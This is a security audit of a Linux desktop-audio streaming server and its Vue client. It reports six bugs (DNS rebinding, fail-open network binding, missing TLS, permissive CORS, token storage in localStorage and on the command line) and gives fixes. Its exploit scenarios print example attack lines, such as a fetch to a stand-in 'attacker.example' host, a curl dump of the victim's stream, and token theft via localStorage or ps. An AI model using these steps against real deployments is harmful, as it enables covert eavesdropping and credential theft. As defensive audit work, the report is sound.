# Security bugs — linux-web-audio

Audit of the audio transmission server (`webaudiod`) and its browser client.
Focus: issues that can leak desktop audio or the bearer token that protects it.

Scope notes:

- Default bind is `127.0.0.1:8642` with no token and CORS off — safe for local use.
- The dangerous cases are misconfiguration (non-loopback / `--cors *`) and the
  default loopback service being reachable from a **victim browser** via DNS
  rebinding when no token is set.
- Pure DoS / resource exhaustion is out of scope unless it enables auth bypass.

---

## BUG-1: DNS rebinding can steal loopback desktop audio (default config)

- **Severity:** High
- **Category:** `dns_rebinding` / `missing_host_check`
- **Confidence:** 9
- **Where:** `cmd/webaudiod/main.go` (default `--listen 127.0.0.1:8642`, empty
  `--token`), `internal/server/server.go` (auth skipped when token empty),
  no `Host` / private-network check anywhere in the HTTP stack

### Description

With the documented defaults the server:

1. Listens only on loopback.
2. Requires **no** bearer token.
3. Does not validate `Host`.
4. Serves `/backend/audio/stream` to any client that can open a TCP connection
   to that loopback port.

Browsers treat `http://127.0.0.1:8642` as a private network target and block
cross-origin reads from public pages (Private Network Access / CORS). They do
**not** apply the same protection when the page’s origin is a public hostname
that the attacker later rebinds to `127.0.0.1`.

So a malicious site can:

1. Serve a page from `attacker.example` while DNS still points at the attacker.
2. After the page loads, flip DNS (or use a short TTL / multiple A records) so
   `attacker.example` resolves to `127.0.0.1`.
3. `fetch('http://attacker.example:8642/backend/audio/stream')` — same origin
   from the browser’s point of view, no CORS, no token — and exfiltrate the
   live desktop audio bitstream.

This is the classic “local HTTP service without Host checks / auth” failure
mode (same family as older Chromecast / router / IDE helper issues).

### Exploit scenario

Victim runs `./bin/webaudiod` (or the stock `deploy/webaudiod.service`).
Victim visits a malicious page. Attacker rebinds the page hostname to
`127.0.0.1` and streams `/backend/audio/stream` (and `/audio/info`) through the
victim’s browser to an attacker-controlled sink. Captured content can include
calls, media, notifications — everything the default sink’s monitor hears.

### Recommendation

Defence in depth; do more than one of:

1. **Require a token by default** for any deployment that might be reached from
   a browser, or refuse to serve `/audio/*` until `--token` / `WEBA_TOKEN` is set
   unless an explicit `--allow-anonymous` is passed.
2. **Validate `Host`**: only accept `127.0.0.1`, `localhost`, `[::1]`, or an
   allow-listed public hostname. Reject unexpected hosts with `400`.
3. Optionally emit `Cache-Control: no-store` (already present on the stream) and
   consider refusing requests that look like cross-site navigations when no
   token is configured.
4. Document DNS rebinding explicitly next to the “loopback is safe” claim in
   the README — loopback without auth is **not** safe against a victim browser.

---

## BUG-2: Non-loopback listen without a token is fail-open

- **Severity:** High
- **Category:** `auth_bypass` / `insecure_default_on_misconfig`
- **Confidence:** 10
- **Where:** `cmd/webaudiod/main.go:299-303` (`checkListen`)

### Description

`checkListen` detects binding beyond loopback with no bearer token, logs a
warning, and **continues**. Desktop audio is then reachable by anyone who can
hit the port. The default listen address is safe; the failure mode is a
one-flag mistake that still starts the server.

### Exploit scenario

```sh
./bin/webaudiod --listen 0.0.0.0:8642
# or --listen :8642
```

Attacker on the LAN (or wider network if exposed):

```sh
curl -N http://victim:8642/backend/audio/stream > loot.webaud
```

No credentials required. `/backend/audio/info` also discloses sink/monitor
names and stream parameters.

### Recommendation

Refuse to start when the listen host is non-loopback and no token is
configured (hard error), or require an explicit
`--i-understand-open-audio` override. Prefer requiring a token for any
non-loopback bind.

---

## BUG-3: No TLS — token and audio are cleartext off-localhost

- **Severity:** High
- **Category:** `missing_tls` / `credential_exposure`
- **Confidence:** 9
- **Where:** `cmd/webaudiod/main.go:203-224` (`http.Server` / `ListenAndServe` only)

### Description

The server has no TLS support. README guidance for exposure is “set `--token`”,
but over plain HTTP the `Authorization: Bearer …` header and the entire audio
payload are sniffable on path (open Wi‑Fi, compromised router, corporate MITM,
etc.). Loopback-only use is fine; network exposure with only a bearer token is
not confidentiality.

### Exploit scenario

Operator binds to a LAN/public interface with `--token SECRET` and no
TLS-terminating reverse proxy. An on-path attacker captures
`Authorization: Bearer SECRET` once, then reconnects indefinitely to
`/backend/audio/stream` and eavesdrops on desktop audio.

### Recommendation

Document that network exposure **requires** a TLS-terminating reverse proxy
(or add `--tls-cert` / `--tls-key`). Warn or refuse when listening non-loopback
without an obvious TLS path. Never treat a bearer token over HTTP as sufficient
confidentiality.

---

## BUG-4: `--cors *` without auth enables browser-origin audio theft

- **Severity:** High
- **Category:** `cors_misconfiguration`
- **Confidence:** 8
- **Where:** `internal/server/cors.go:95-96`, `118`; `cmd/webaudiod/main.go:83-84`

### Description

`--cors *` sets `Access-Control-Allow-Origin: *` and allows the `Authorization`
request header. Comments assume a bearer token. If the operator also runs
without a token (especially on a non-loopback or intranet-reachable address),
**any website** the victim visits can `fetch()` the stream/info endpoints and
read the body in JS.

Default CORS-off is safe for browsers; `*` removes that protection.
(Disallowed origins still receive a response body by design; browsers hide it —
that part alone is not a bug.)

### Exploit scenario

```sh
./bin/webaudiod --listen 0.0.0.0:8642 --cors '*'
```

Victim browses `https://evil.example`. Page runs:

```js
const r = await fetch('http://192.168.1.10:8642/backend/audio/stream')
// ACAO: * → JS can read the body and exfiltrate it
```

Direct `curl` from the attacker also works (BUG-2); CORS `*` adds
**browser-origin** exfil when the attacker cannot reach the host but the
victim’s browser can (e.g. split-horizon / captive portal / guest Wi‑Fi).

### Recommendation

Refuse `--cors *` unless a token is configured. Prefer an explicit origin
allow-list. Document that `*` + no token + reachable bind = cross-site audio
theft.

---

## BUG-5: Bearer token persisted in `localStorage`

- **Severity:** Medium
- **Category:** `insecure_storage`
- **Confidence:** 8
- **Where:** `frontend/src/App.vue:17-21`, `51-55`, `176-182`

### Description

Settings including `token` are JSON-serialized to `localStorage` under
`linux-web-audio:settings`. Any XSS on the page origin (or a malicious
extension / shared-browser access) can read the bearer token that protects the
audio API. The input is `type="password"` in the UI, but persistence is
plaintext in web storage.

No `v-html` / obvious XSS sink was found in-app; this is still a meaningful
secret-handling weakness for a high-sensitivity stream.

### Exploit scenario

Attacker finds XSS on the origin that serves the UI (or the user has a
malicious extension). Script runs:

```js
JSON.parse(localStorage.getItem('linux-web-audio:settings')).token
```

and uses it to open `/audio/stream` from anywhere the API is reachable.

### Recommendation

Do not persist the token (keep it in memory only), or use `sessionStorage`
with a clear warning. Prefer a same-origin proxy that injects auth server-side
so the browser never stores a long-lived bearer secret.

---

## BUG-6: `--token` on argv exposes the secret in the process list

- **Severity:** Medium
- **Category:** `credential_exposure`
- **Confidence:** 9
- **Where:** `cmd/webaudiod/main.go:80`, `346-350`

### Description

`--token` is a normal flag; the value appears in `ps` / `/proc/*/cmdline` to
any local user. `WEBA_TOKEN` is supported and is better, but the flag remains
the convenient option and is equally accepted by `resolveToken`.

### Exploit scenario

Shared multi-user machine. User A runs:

```sh
webaudiod --token s3cr3t --listen 0.0.0.0:8642
```

User B runs `ps auxww | grep webaudiod`, copies the token, and streams A’s
desktop audio.

### Recommendation

Prefer env or a mode-`0600` token file; warn (or refuse) when `--token` puts a
secret on argv. Document that argv tokens are not secret on shared hosts.
Update `deploy/webaudiod.service` examples to use `Environment=WEBA_TOKEN=…`
(or `EnvironmentFile=`) rather than embedding secrets in `ExecStart`.

---

## Checked and not reported as bugs

| Area | Result |
| --- | --- |
| Auth on `/audio/info` vs `/audio/stream` | Same gate when a token is set |
| `/healthz` unauthenticated | Intentional; does not leak stream audio |
| OPTIONS / CORS preflight before auth | Correct; no auth bypass |
| Base-path `..` / empty segments | Rejected by `NormaliseBasePath` |
| `?codec=` / `?from_seq=` | Allow-listed / bounded parses |
| Timing-safe token compare (`!=`) | Not constant-time; impractical over HTTP here |
| CORS denying Origin but still writing body | Expected browser model |
| Sink names in `/audio/info` | Only available when the caller can already auth (or auth is off) |
| Frontend XSS sinks (`v-html`, etc.) | None found in `frontend/src` |

---

## Priority fixes

1. **Fail closed** on non-loopback + no token (BUG-2).
2. **Host allow-list** and/or **default-on token** to kill DNS rebinding against
   the stock loopback service (BUG-1).
3. **Require TLS** (proxy or native) whenever binding beyond loopback; don’t
   imply `--token` alone is enough (BUG-3).
4. **Reject or tightly constrain `--cors *`** without auth (BUG-4).
5. **Stop persisting** the bearer token in `localStorage` (BUG-5).
6. **Avoid argv tokens**; prefer `WEBA_TOKEN` or a secret file (BUG-6).
